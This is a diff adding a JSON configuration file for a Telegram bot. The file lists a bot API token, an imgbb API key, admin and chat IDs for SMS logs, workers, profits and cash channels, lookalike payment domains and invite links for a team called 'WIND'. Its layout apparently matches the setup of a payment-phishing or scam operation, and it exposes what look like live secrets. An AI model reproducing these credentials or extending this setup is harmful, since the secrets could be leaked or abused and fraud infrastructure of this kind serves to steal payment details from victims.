@@ -1,0 +1,27 @@
+{
+    "bot": {
+        "api_key": "5178915264:AAEkfqnb0cUID08AiPVfVaW9hcTun1VjyYc",
+        "admin_id": 1674971092, 
+        "sms_logs": -1001749397111,
+        "admin_logs":  -1001749397111,
+        "request_logs":  -1001749397111,
+        "workers_chat":  -1001611566040,
+        "profits_channel":  -1001778856727,
+        "cassa_chat":  -1001749397111,
+        "archive_chat":  -1001749397111
+    },
+
+    "backend": {
+        "domain": "payment-true.com",
+        "domain2": "payment-true.com",
+        "domain3": "save-payments302021.xyz",
+        "imgbb_api": "ac7dcc9ff5de2f32fabfb58a40410683"
+    },
+
+    "teamInfo": {
+        "name": "WIND",
+        "admin_username": "luci0l0l",
+        "chat_link": "https://t.me/+dUAv0jneH7I1ZGUy",
+        "profits_channel": "https://t.me/+ZIG4SRyG6fdlNzgy"
+    }
+}
